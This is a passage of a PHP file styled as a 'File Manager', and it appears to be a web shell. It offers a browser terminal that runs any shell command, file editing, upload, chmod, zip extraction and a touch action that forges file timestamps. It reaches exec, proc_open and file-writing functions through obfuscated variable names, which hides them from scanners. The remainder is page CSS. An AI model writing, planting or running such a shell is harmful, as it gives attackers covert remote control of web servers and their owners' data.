    foreach($paths as $rel){ $p=fm_abs((string)$rel,true); if(!$p||$p===$ROOT){$errors[]='Invalid path';continue;} if(fm_delete($p))$deleted++;else $errors[]='Failed: '.basename($p); }
    fm_json(['success'=>$deleted>0 && !$errors,'deleted'=>$deleted,'error'=>$errors?implode(', ',$errors):'']);
  }
  if($a==='chmod'){
    $p=fm_abs($_POST['path']??'',true);
    if(!$p||$p===$ROOT)fm_json(['success'=>false,'error'=>'Invalid path.'],400);
    $modeRaw=trim((string)($_POST['mode']??''));
    if(!preg_match('/^[0-7]{3,4}$/',$modeRaw))fm_json(['success'=>false,'error'=>'Invalid chmod mode. Use 3 or 4 octal digits, for example 644 or 0755.'],400);
    if(strlen($modeRaw)===3)$modeRaw='0'.$modeRaw;
    $mode=octdec($modeRaw); global $OO_00_chmod_Func; $ok=@$OO_00_chmod_Func($p,$mode); clearstatcache(true,$p);
    $current=@fileperms($p); $currentMode=$current===false?'':substr(sprintf('%o',$current),-4);
    fm_json(['success'=>(bool)$ok,'mode'=>$currentMode,'error'=>$ok?'':'chmod failed. Check permissions/owner.']);
  }
  if($a==='touch'){
    $p=fm_abs($_POST['path']??'',true);
    if(!$p||$p===$ROOT)fm_json(['success'=>false,'error'=>'Invalid path.'],400);
    $dateRaw=trim((string)($_POST['datetime']??''));
    if($dateRaw==='')fm_json(['success'=>false,'error'=>'Date and time are required.'],400);
    $dt=DateTime::createFromFormat('!Y-m-d H:i:s',$dateRaw);
    $errors=DateTime::getLastErrors();
    if(!$dt || ($errors!==false && ($errors['warning_count']||$errors['error_count'])))fm_json(['success'=>false,'error'=>'Invalid date/time. Use YYYY-MM-DD HH:MM:SS.'],400);
    $ts=$dt->getTimestamp();
    global $OO_00_touch_Func; $ok=@$OO_00_touch_Func($p,$ts,$ts);
    clearstatcache(true,$p);
    $newTime=@filemtime($p);
    fm_json(['success'=>(bool)$ok,'modified'=>$newTime?:$ts,'modifiedText'=>date('Y-m-d H:i:s',$newTime?:$ts),'error'=>$ok?'':'Touch failed. Check permissions/owner.']);
  }
  if($a==='copy'||$a==='move'){
    $paths=[];
    if(isset($_POST['paths'])){ $paths=json_decode((string)$_POST['paths'],true); if(!is_array($paths))$paths=[]; }
    if(!$paths && isset($_POST['oldPath'])) $paths=[(string)$_POST['oldPath']];
    $destRel=(string)($_POST['destDir']??'/');
    $d=fm_abs($destRel,true);
    if(!$d||!is_dir($d)) fm_json(['success'=>false,'error'=>'Invalid destination directory.'],400);
    $errors=[]; $done=0;
    foreach($paths as $rel){
      $s=fm_abs((string)$rel,true);
      if(!$s||$s===$ROOT){$errors[]='Invalid source';continue;}
      if($s===$d){$errors[]='Source and destination are the same: '.basename($s);continue;}
      $sr=realpath($s);$dr=realpath($d);
      if($sr&&$dr&&is_dir($s)&&strncmp($dr,$sr,strlen($sr))===0){$errors[]='Cannot put folder inside itself: '.basename($s);continue;}
      $dst=$d.DIRECTORY_SEPARATOR.basename($s);
      if(file_exists($dst)){$errors[]='Already exists: '.basename($s);continue;}
      $ok=$a==='copy'?fm_copy($s,$dst):@rename($s,$dst);
      if($ok)$done++;else $errors[]='Failed: '.basename($s);
    }
    fm_json(['success'=>$done>0 && !$errors,'done'=>$done,'error'=>$errors?implode(' | ',$errors):'']);
  }
  if($a==='terminal'){
      $cwdRel=(string)($_POST['cwd']??'/');
      $cwdMode=(string)($_POST['cwdMode']??'fm');
      if($cwdMode==='fm'){ $cwd=fm_abs($cwdRel,true); }else{ $cwd=fm_terminal_dir($cwdRel); }
      if(!$cwd||!is_dir($cwd))fm_json(['success'=>false,'error'=>'Invalid terminal directory.'],400);
      $cmd=trim((string)($_POST['command']??''));
      if($cmd==='')fm_json(['success'=>true,'output'=>'','exitCode'=>0,'cwd'=>fm_terminal_display_cwd($cwd)]);
      if(strlen($cmd)>12000)fm_json(['success'=>false,'error'=>'Command is too long.'],400);
      $output='';$exitCode=127; $shell='/bin/sh';
      $cwdMarker='__FM_CWD__'.bin2hex(random_bytes(8)).'__';
      $wrappedCmd=$cmd.'; __fm_rc=$?; printf '.escapeshellarg($cwdMarker.'%s\n').' "$PWD"; exit $__fm_rc';
      global $OO_00_proc_open_Func, $OO_00_exec_Func;
      if(function_exists($OO_00_proc_open_Func)&&is_executable($shell)){
          $descriptors=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
          $proc=@$OO_00_proc_open_Func($shell.' -lc '.escapeshellarg($wrappedCmd),$descriptors,$pipes,$cwd,['TERM'=>'xterm-256color','HOME'=>getenv('HOME')?:$cwd]);
          if(is_resource($proc)){
              fclose($pipes[0]); 
              stream_set_blocking($pipes[1],false);stream_set_blocking($pipes[2],false);
              $start=microtime(true);$stdout='';$stderr='';
              while(true){
                  $read=[$pipes[1],$pipes[2]];$write=null;$except=null;
                  $sel=@stream_select($read,$write,$except,0,200000);
                  if($sel!==false&&$sel>0){foreach($read as $r){$chunk=@stream_get_contents($r);if($r===$pipes[1])$stdout.=$chunk;else $stderr.=$chunk;}}
                  if(strlen($stdout)+strlen($stderr)>65536){@proc_terminate($proc);$stdout=substr($stdout,0,65536);$stderr.="\n[Output truncated at 64 KB]";break;}
                  $status=@proc_get_status($proc); if(!$status['running']){$exitCode=(int)$status['exitcode'];break;}
                  if(microtime(true)-$start>15){@proc_terminate($proc);$exitCode=124;$stderr.="\n[Command timed out after 15 seconds]";break;}
              }
              $stdout.= (string)@stream_get_contents($pipes[1]);$stderr.= (string)@stream_get_contents($pipes[2]);
              fclose($pipes[1]);fclose($pipes[2]);
              $closed=@proc_close($proc);if($exitCode===127&&is_int($closed))$exitCode=$closed;
              $output=$stdout.($stderr!=''?($stdout!=''?"\n":'').$stderr:'');
          }
      }elseif(function_exists($OO_00_exec_Func)){
          $tmp='';$status=127;$wrapped='timeout 15s '.$shell.' -lc '.escapeshellarg($wrappedCmd);
          @$OO_00_exec_Func('cd '.escapeshellarg($cwd).' && '.$wrapped.' 2>&1',$lines,$status);
          $output=implode("\n",$lines);$exitCode=(int)$status;
      }else{
          fm_json(['success'=>false,'error'=>'Terminal unavailable: proc_open and exec are disabled.'],500);
      }
      $output=preg_replace('/\\x1B\\[[0-?]*[ -\/]*[@-~]/','',$output); $newCwd=$cwd; $markerPos=strrpos($output,$cwdMarker);
      if($markerPos!==false){
          $after=substr($output,$markerPos+strlen($cwdMarker)); $lineEnd=strpos($after,"\n");
          $shellCwd=trim($lineEnd===false?$after:substr($after,0,$lineEnd));
          if($shellCwd!=='' && is_dir($shellCwd)){ $realShellCwd=realpath($shellCwd); if($realShellCwd!==false)$newCwd=$realShellCwd; }
          $output=rtrim(substr($output,0,$markerPos),"\r\n");
      }
      $newMode='fs'; $newDisplay=fm_terminal_display_cwd($newCwd); if(fm_inside($newCwd)){ $newMode='fm'; $newDisplay=fm_rel($newCwd)??'/'; }
      fm_json(['success'=>true,'output'=>$output,'exitCode'=>$exitCode,'cwd'=>$newDisplay,'cwdMode'=>$newMode]);
  }
  if($a==='edit'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||!fm_editable($p))fm_json(['success'=>false,'error'=>'File is not editable.'],400);if((@filesize($p)?:0)>10*1024*1024)fm_json(['success'=>false,'error'=>'File is larger than 10 MB.'],400);global $OO_00_file_get_contents_Func;$c=@$OO_00_file_get_contents_Func($p);if($c===false)fm_json(['success'=>false,'error'=>'Cannot read file.'],500);if(fm_binary_editable($p,$c)){fm_json(['success'=>true,'binary'=>true,'encoding'=>'base64','content'=>base64_encode($c)]);}fm_json(['success'=>true,'binary'=>false,'encoding'=>'base64','content'=>base64_encode($c)]);}
  if($a==='save'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||!fm_editable($p))fm_json(['success'=>false,'error'=>'File is not editable.'],400);$content=(string)($_POST['content']??'');if((string)($_POST['encoding']??'')==='base64'){$decoded=base64_decode($content,true);if($decoded===false)fm_json(['success'=>false,'error'=>'Invalid Base64 data.'],400);$content=$decoded;}elseif(fm_binary_editable($p)&&((string)($_POST['binary']??'')==='1')){$decoded=base64_decode($content,true);if($decoded===false)fm_json(['success'=>false,'error'=>'Invalid binary data.'],400);$content=$decoded;}global $OO_00_file_put_contents_Func;$ok=@$OO_00_file_put_contents_Func($p,$content,LOCK_EX)!==false;if($ok){clearstatcache(true,$p);if(function_exists('opcache_invalidate')){@opcache_invalidate($p,true);}}fm_json(['success'=>$ok,'error'=>$ok?'':'Save failed.','cacheInvalidated'=>$ok&&function_exists('opcache_invalidate')]);}
  if($a==='createZip'){$p=fm_abs($_POST['path']??'',true);if(!$p||(!is_dir($p)&&!is_file($p)))fm_json(['success'=>false,'error'=>'Invalid file or folder.'],400);$name=(string)($_POST['name']??(basename($p).'.zip'));[$ok,$msg]=fm_create_zip_file($p,$name);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
  if($a==='bulkZip'){ $raw=$_POST['paths']??''; $paths=json_decode((string)$raw,true); if(!is_array($paths)||count($paths)<2) fm_json(['success'=>false,'error'=>'Select at least 2 files or folders.'],400); $abs=[]; foreach($paths as $rel){$q=fm_abs((string)$rel,true); if(!$q||(!is_file($q)&&!is_dir($q))) fm_json(['success'=>false,'error'=>'Invalid selected path.'],400); $abs[]=$q;} $parent=$ROOT; $allSame=true; foreach($abs as $q){if(dirname($q)!==$parent){$allSame=false;break;}} $name=(string)($_POST['name']??('bulk-'.date('Ymd-His').'.zip')); $name=preg_replace('/[^A-Za-z0-9._ -]/u','_',trim($name)); if($name==='')$name='bulk-'.date('Ymd-His').'.zip'; if(strtolower(substr($name,-4))!=='.zip')$name.='.zip'; $dest=fm_unique_dest($stateDir=fm_abs($_POST['destDir']??fm_rel(dirname($abs[0])),true),$name); if(!$stateDir||!is_dir($stateDir)) fm_json(['success'=>false,'error'=>'Invalid destination directory.'],400); $tmp=tempnam(sys_get_temp_dir(),'fmbulk_'); if($tmp===false) fm_json(['success'=>false,'error'=>'Cannot create temporary ZIP.'],500); @unlink($tmp); $tmp.='.zip'; $ok=false; $err=''; if(class_exists('ZipArchive')){ $z=new ZipArchive(); if($z->open($tmp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){ foreach($abs as $q){$base=basename($q); if(is_file($q)){$z->addFile($q,$base);}else{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($q,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST); $z->addEmptyDir($base); foreach($it as $f){$rel=substr($f->getPathname(),strlen($q)+1);$entry=$base.'/'.$rel;if($f->isDir())$z->addEmptyDir(str_replace('\\','/',$entry));else $z->addFile($f->getPathname(),str_replace('\\','/',$entry));}}} $ok=$z->close(); if(!$ok)$err='ZipArchive could not finalize archive.';} } if(!$ok){$candidates=fm_command_candidates('zip',['/usr/bin/zip','/bin/zip']); $relNames=[]; foreach($abs as $q)$relNames[]=basename($q); foreach($candidates as $zipbin){$cmd='cd '.escapeshellarg($stateDir).' && '.escapeshellarg($zipbin).' -r -q '.escapeshellarg($tmp).' '.implode(' ',array_map('escapeshellarg',$relNames)).' 2>&1'; [$st,$out]=fm_run_command($cmd); if($st===0&&is_file($tmp)&&filesize($tmp)>0){$ok=true;break;} $err=trim($out);} } if(!$ok||!is_file($tmp)){@unlink($tmp);fm_json(['success'=>false,'error'=>$err!==''?$err:'No ZIP engine was available.'],500);} if(!@rename($tmp,$dest)){if(!@copy($tmp,$dest)){@unlink($tmp);fm_json(['success'=>false,'error'=>'Cannot save ZIP file.'],500);}@unlink($tmp);} fm_json(['success'=>true,'message'=>'Created '.basename($dest)]); }
  if($a==='downloadZip'){ $p=fm_abs($_POST['path']??'',true); if(!$p||(!is_dir($p)&&!is_file($p)))fm_json(['success'=>false,'error'=>'Invalid file or folder.'],400); [$ok,$tmp,$err]=fm_zip_directory($p); if(!$ok)fm_json(['success'=>false,'error'=>$err],500); while(ob_get_level())ob_end_clean(); header('Content-Type: application/zip'); header('Content-Length: '.filesize($tmp)); header('Content-Disposition: attachment; filename="'.basename($p).'.zip"'); global $OO_00_readfile_Func; @$OO_00_readfile_Func($tmp); @unlink($tmp); exit; }
  if($a==='view'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p))fm_json(['success'=>false,'error'=>'Invalid file.'],400);$isZip=(strtolower(pathinfo($p,PATHINFO_EXTENSION))==='zip');if(!$isZip){$max=4*1024*1024;$size=@filesize($p);if($size!==false&&$size>$max)fm_json(['success'=>false,'error'=>'Preview is limited to 4 MB for text documents.'],413);}global $OO_00_file_get_contents_Func;$content=@$OO_00_file_get_contents_Func($p);if($content===false)fm_json(['success'=>false,'error'=>'Unable to read file.'],500);if(strpos($content,"\0")!==false)fm_json(['success'=>false,'error'=>'Binary files cannot be previewed as text.'],415);fm_json(['success'=>true,'content'=>base64_encode($content),'encoding'=>'base64']);}
  if($a==='zipInfo'){ $p=fm_abs($_POST['path']??'',true); if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP archive.'],400); $size=(int)(@filesize($p)?:0); $mtime=(int)(@filemtime($p)?:0); $entries=[]; $total=0; $compressed=0; $files=0; $folders=0; if(class_exists('ZipArchive')){$z=new ZipArchive();if($z->open($p)===true){for($i=0;$i<$z->numFiles;$i++){$st=$z->statIndex($i);$name=$st['name']??$z->getNameIndex($i);if($name===false||$name==='')continue;if(!fm_zip_entry_safe($name))continue;$isDir=(substr($name,-1)==='/')||(($st['size']??0)===0&&($st['crc']??0)===0&&substr($name,-1)==='/');$usize=(int)($st['size']??0);$csize=(int)($st['comp_size']??0);if($isDir)$folders++;else{$files++;$total+=$usize;$compressed+=$csize;}$entries[]=['name_b64'=>base64_encode($name),'folder'=>$isDir,'size'=>$usize,'compressed'=>$csize];}$z->close();}} if(!$entries&&$files===0&&$folders===0){$candidates=fm_command_candidates('unzip',['/usr/bin/unzip','/bin/unzip']);foreach($candidates as $unzip){$cmd=escapeshellarg($unzip).' -Z1 '.escapeshellarg($p).' 2>&1';[$st,$listing]=fm_run_command($cmd);if($st!==0)continue;foreach(preg_split('/\r?\n/',$listing) as $name){$name=trim($name);if($name===''||!fm_zip_entry_safe($name))continue;$isDir=substr($name,-1)==='/';if($isDir)$folders++;else $files++;$entries[]=['name_b64'=>base64_encode($name),'folder'=>$isDir,'size'=>0,'compressed'=>0];}break;}} if(!$entries&&$size>0)fm_json(['success'=>false,'error'=>'Unable to read ZIP archive contents.'],500); fm_json(['success'=>true,'name'=>basename($p),'path'=>fm_rel($p),'modified'=>$mtime,'size'=>$size,'entries'=>$entries,'files'=>$files,'folders'=>$folders,'totalSize'=>$total,'compressedSize'=>$compressed]); }
  if($a==='download'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p))fm_json(['success'=>false,'error'=>'Invalid file.'],400);while(ob_get_level())ob_end_clean();header('Content-Type: application/octet-stream');header('Content-Length: '.filesize($p));header('Content-Disposition: attachment; filename="'.basename($p).'"');global $OO_00_readfile_Func; @$OO_00_readfile_Func($p);exit;}
  if($a==='unzip'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP file.'],400);$destRel=(string)($_POST['destDir']??fm_rel(dirname($p)));$dest=fm_abs($destRel,true);if(!$dest){$dest=fm_abs($destRel,false);if($dest&&!is_dir($dest)) { global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($dest,0755,true); }}$dest=$dest&&realpath($dest)?realpath($dest):$dest;if(!$dest||!is_dir($dest))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($p,$dest);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
  if($a==='upload'||$a==='uploadFileOnly'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file']))fm_json(['success'=>false,'error'=>'Upload failed.'],400);$files=$_FILES['file'];$names=is_array($files['name']??null)?$files['name']:[$files['name']??''];$tmps=is_array($files['tmp_name']??null)?$files['tmp_name']:[$files['tmp_name']??''];$errs=is_array($files['error']??null)?$files['error']:[$files['error']??UPLOAD_ERR_NO_FILE];$uploaded=[];$errors=[];foreach($names as $i=>$rawName){$n=fm_name($rawName);$err=(int)($errs[$i]??UPLOAD_ERR_NO_FILE);$tmp=$tmps[$i]??'';if(!$n||$err!==UPLOAD_ERR_OK){$errors[]=$rawName!==''?(string)$rawName:'Invalid upload';continue;}$dst=$d.DIRECTORY_SEPARATOR.$n;if(file_exists($dst)){$errors[]='File already exists: '.$n;continue;}if(@move_uploaded_file($tmp,$dst))$uploaded[]=$n;else $errors[]='Cannot move uploaded file: '.$n;}fm_json(['success'=>count($uploaded)>0 && count($errors)===0,'uploaded'=>$uploaded,'errors'=>$errors,'count'=>count($uploaded),'error'=>count($errors)?implode(' | ',$errors):'']);}
  if($a==='createDirsBatch'){$base=fm_abs($_POST['basePath']??'/',true);$dirs=json_decode($_POST['dirs']??'[]',true);if(!$base||!is_array($dirs))fm_json(['success'=>false,'error'=>'Invalid directories.'],400);usort($dirs,fn($x,$y)=>substr_count($x,'/')<=>substr_count($y,'/'));foreach($dirs as $rel){$rel=str_replace('\\','/',(string)$rel);if(strpos($rel,'..')!==false||($rel!==''&&$rel==='/')) continue;$p=fm_abs(rtrim($base==='/'?'':$base,'/').'/'.$rel,false);if($p&&!is_dir($p)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($p,0755,true);}}fm_json(['success'=>true]);}
  if($a==='uploadAndUnzip'||$a==='uploadZipForExtract'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file'])||$_FILES['file']['error']!==UPLOAD_ERR_OK)fm_json(['success'=>false,'error'=>'Archive upload failed.'],400);$tmp=$_FILES['file']['tmp_name'];$extractRel=(string)($_POST['extractPath']??$_POST['dir']??$_POST['basePath']??'/');$extract=fm_abs($extractRel,true);if(!$extract){$extract=fm_abs($extractRel,false);if($extract&&!is_dir($extract)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($extract,0755,true);}}if(!$extract||!is_dir($extract))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($tmp,$extract);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
  fm_json(['success'=>false,'error'=>'Unknown action.'],400);
 }catch(Throwable $e){fm_json(['success'=>false,'error'=>$e->getMessage()],500);}
}
?>
<!doctype html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/dialog/dialog.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-beautify/1.15.1/beautify-html.min.js"></script>
    <style>
      /*  - Modern File Manager */
      /* Default to dark theme */
      :root {
          --bg-primary: #1e1e2d;
          --bg-secondary: #151521;
          --bg-tertiary: #1a1a27;
          --bg-hover: #2b2b40;
          --bg-active: #2b2b40;
          --text-primary: #ffffff;
          --text-secondary: #92929f;
          --text-muted: #565674;
          --border-color: #2b2b40;
          --border-light: #323248;
          --accent-color: #009ef7;
          --accent-hover: #0095e8;
          --success-color: #50cd89;
          --danger-color: #f1416c;
          --warning-color: #ffc700;
          --info-color: #7239ea;
          --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06);
          --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.07), 0 2px 4px rgba(0, 0, 0, 0.06);
          --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.1), 0 6px 10px rgba(0, 0, 0, 0.08);
          --shadow-glow: 0 0 20px rgba(0, 158, 247, 0.15);
          --radius-sm: 0.425rem;
          --radius: 0.625rem;
          --radius-lg: 1rem;
          --transition: all 0.3s ease;
      }
      
      [data-theme="light"] {
          --bg-primary: #ffffff;
          --bg-secondary: #f5f8fa;
          --bg-tertiary: #ffffff;
          --bg-hover: #f3f6f9;
          --bg-active: #e8f5ff;
          --text-primary: #181c32;
          --text-secondary: #5e6278;
          --text-muted: #a1a5b7;
          --border-color: #eff2f5;
          --border-light: #e4e6ef;
      }
      
      /* Keep this for backwards compatibility */
      [data-theme="dark"] {
          --bg-primary: #1e1e2d;
          --bg-secondary: #151521;
          --bg-tertiary: #1a1a27;
          --bg-hover: #2b2b40;
          --bg-active: #2b2b40;
          --text-primary: #ffffff;
          --text-secondary: #92929f;
          --text-muted: #565674;
          --border-color: #2b2b40;
          --border-light: #323248;
      }
      
      /* Font Awesome Icon Colors */
      .fas.fa-home, .fas.fa-folder { color: #f39c12; }
      .fas.fa-file, .fas.fa-file-alt { color: #3498db; }
      .fas.fa-file-pdf { color: #e74c3c; }
      .fas.fa-file-word { color: #2980b9; }
      .fas.fa-file-excel { color: #27ae60; }
      .fas.fa-file-image { color: #9b59b6; }
      .fas.fa-file-audio { color: #e67e22; }
      .fas.fa-file-video { color: #e74c3c; }
      .fas.fa-file-archive { color: #95a5a6; }
      .fas.fa-file-code { color: #8e44ad; }
      .fab.fa-html5 { color: #e34f26; }
      .fab.fa-css3-alt { color: #1572b6; }
      .fab.fa-js-square { color: #f7df1e; }
      .fab.fa-php { color: #777bb4; }
      .fab.fa-python { color: #3776ab; }
      .fab.fa-java { color: #f89820; }
      .fab.fa-git-alt { color: #f05032; }
      .fab.fa-docker { color: #2496ed; }
      .fab.fa-markdown { color: #000000; }
      .fas.fa-database { color: #336791; }
      .fas.fa-cog { color: #7f8c8d; }
      .fas.fa-lock { color: #e74c3c; }
      .fas.fa-hammer { color: #95a5a6; }
      .fas.fa-book-open { color: #3498db; }
      .fas.fa-certificate { color: #f39c12; }
      .fas.fa-clipboard-list { color: #2ecc71; }
      .fas.fa-edit { color: #f39c12; }
      .fas.fa-trash { color: #e74c3c; }
      .fas.fa-download { color: #27ae60; }
      .fas.fa-arrows-alt { color: #3498db; }
      .fas.fa-upload { color: #2ecc71; }
      .fas.fa-sync-alt { color: #3498db; }
      .fas.fa-moon { color: #f39c12; }
      .fas.fa-undo { color: #95a5a6; }
      .fas.fa-eye { color: #9b59b6; }
      .fas.fa-paint-brush { color: #e67e22; }
      .fas.fa-code { color: #2c3e50; }
      .fas.fa-spinner { color: #3498db; }
      .fas.fa-arrow-up { color: #95a5a6; }
      .fm-archive-viewer{display:flex;flex-direction:column;min-height:0;height:100%;gap:0}
      .fm-archive-summary{border:1px solid var(--border-color);border-radius:8px;background:var(--panel-2);overflow:hidden}
      .fm-archive-summary>div{padding:12px 16px;border-bottom:1px solid var(--border-color);font-size:14px;line-height:1.45}
      .fm-archive-summary>div:last-child{border-bottom:0}
      .fm-archive-summary b{color:var(--text-primary)}
      .fm-archive-title{font-size:15px!important;border-color:var(--accent)!important}
      .fm-zip-list-head{display:flex;justify-content:space-between;align-items:center;padding:12px 4px 8px;color:var(--text-primary);font-weight:700}
      .fm-zip-list-head span:last-child{font-weight:400;color:var(--text-secondary);font-size:12px}
      .fm-zip-entries{border:1px solid var(--border-color);border-radius:8px;background:var(--panel-1);overflow:auto;max-height:360px;padding:5px}
      .fm-zip-entry{display:flex;align-items:center;gap:9px;padding:7px 9px;padding-left:calc(9px + (var(--zip-depth,0) * 22px));border-radius:5px;color:var(--text-primary);min-width:0}
      .fm-zip-entry:hover{background:var(--hover-bg)}
      .fm-zip-entry i{width:16px;text-align:center;flex:0 0 16px}
      .fm-zip-entry.folder i{color:#f1c40f}
      .fm-zip-entry>span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
      .fm-zip-entry small{color:var(--text-secondary);font-size:11px;flex:0 0 auto}
      .fm-zip-empty{padding:25px;text-align:center;color:var(--text-secondary)}
      
      * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
      }
      
      body {
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
          background: var(--bg-secondary);
          color: var(--text-primary);
          font-size: 13px;
          line-height: 1.5;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
      }
      
      /* Main Layout */
      .file-manager-container {
          display: flex;
          height: 100vh;
          overflow: hidden;
      }
      
      /* Sidebar */
      .sidebar {
          width: 265px;
          background: var(--bg-primary);
          border-right: 1px solid var(--border-color);
          display: flex;
          flex-direction: column;
          transition: var(--transition);
      }
      
      .sidebar-header {
          padding: 1.5rem;
          border-bottom: 1px solid var(--border-color);
          display: flex;
          justify-content: space-between;
          align-items: center;
      }
      
      .sidebar-logo {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          font-size: 1.25rem;
          font-weight: 600;
          color: var(--text-primary);
      }
      
      .sidebar-close-btn {
          display: none;
          background: none;
          border: none;
          font-size: 1.5rem;
          color: var(--text-secondary);
          cursor: pointer;
          padding: 0.25rem;
          border-radius: var(--radius);
          transition: var(--transition);
      }
      
      .sidebar-close-btn:hover {
          background: var(--bg-hover);
          color: var(--text-primary);
      }
      
      .sidebar-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.5);
          z-index: 99;
          display: none;
          opacity: 0;
          transition: opacity 0.3s ease;
      }
      
      .sidebar-overlay.show {
          display: block;
          opacity: 1;
      }
      
      .sidebar-nav {
          padding: 1.5rem 1rem;
          flex: 1;
          overflow-y: auto;
      }
      
      .server-info-box {
          margin: 0 1rem 1rem;
          padding: 13px 12px;
          background: var(--bg-secondary);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          box-shadow: var(--shadow-md);
          font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', monospace;
          font-size: 10px;
          line-height: 1.55;
          color: var(--text-secondary);
          overflow: hidden;
          flex-shrink: 0;
      }
      .server-info-title {
          color: var(--accent-color);
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          font-size: 11px;
          font-weight: 700;
          text-transform: uppercase;
          letter-spacing: .5px;
          margin-bottom: 7px;
      }
      .server-info-subtitle{font-size:8px;color:var(--text-muted);letter-spacing:.55px;margin:-3px 0 8px;text-transform:uppercase}.server-info-line {
          display: grid;grid-template-columns: 76px 1fr;gap:5px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
      }
      .server-info-line .si-label { color: var(--success-color); font-weight:700; }
      .server-info-line .si-value { color: var(--text-secondary); }
      .server-info-line.si-user .si-value { color: var(--warning-color); font-weight: 700; }
      .server-info-line.si-time .si-value { color: var(--accent-color); }
      .server-info-line.si-status .si-value{color:var(--success-color);font-weight:700}.server-info-line.si-status .si-value i{font-size:6px;vertical-align:middle}
      .server-info-line.si-pcntl .si-value{color:var(--danger-color);font-weight:700;text-transform:uppercase}
      .server-info-line.si-pcntl .si-label{color:var(--danger-color)}
      .server-info-storage{margin-top:7px;padding-top:7px;border-top:1px solid var(--border-light)}
      .server-storage-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:5px}
      .server-storage-head .si-label{color:var(--success-color);font-weight:700}
      .server-storage-head .si-free{color:var(--success-color);font-weight:700}
      .server-storage-bar{height:6px;border-radius:20px;background:var(--border-color);overflow:hidden;box-shadow:inset 0 1px 2px rgba(0,0,0,.25)}
      .server-storage-bar>span{display:block;height:100%;width:0;border-radius:20px;background:linear-gradient(90deg,var(--success-color),var(--accent-color));transition:width .4s ease}
      .server-storage-meta{margin-top:4px;font-size:8px;color:var(--text-muted);display:flex;justify-content:space-between}
      .server-info-pcntl { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
      @media(max-width:768px){.server-info-box{margin:0 .75rem .75rem;font-size:9px}}
      
      .sidebar-logout{
          display:flex;align-items:center;gap:.75rem;margin:0 1rem .9rem;padding:.72rem .8rem;
          border:1px solid rgba(241,65,108,.28);border-radius:.625rem;background:rgba(241,65,108,.08);
          color:#f1416c;text-decoration:none;font-size:13px;font-weight:600;transition:all .2s ease;
          flex-shrink:0;
      }
      .sidebar-logout i{color:#f1416c;width:18px;text-align:center}
      .sidebar-logout:hover{background:rgba(241,65,108,.16);border-color:#f1416c;transform:translateY(-1px)}
      .login-page{min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg-secondary);padding:20px}
      .login-card{width:390px;max-width:100%;padding:30px;background:var(--bg-primary);border:1px solid var(--border-color);border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.35)}
      .login-brand{display:flex;align-items:center;justify-content:center;gap:12px;font-size:25px;font-weight:700;color:var(--text-primary)}
      .login-brand i{color:#f39c12}
      .login-subtitle{text-align:center;color:var(--text-secondary);margin:8px 0 26px;font-size:13px}
      .login-field{margin-bottom:16px}.login-field label{display:block;margin-bottom:7px;color:var(--text-secondary);font-size:12px;font-weight:600}
      .login-input-wrap{display:flex;align-items:center;gap:10px;height:46px;padding:0 13px;background:var(--bg-secondary);border:1px solid var(--border-light);border-radius:9px;transition:.2s}
      .login-input-wrap:focus-within{border-color:var(--accent-color);box-shadow:0 0 0 3px rgba(0,158,247,.1)}
      .login-input-wrap i{color:var(--text-muted);width:17px;text-align:center}.login-input-wrap input{flex:1;border:0;outline:0;background:transparent;color:var(--text-primary);font-size:13px}
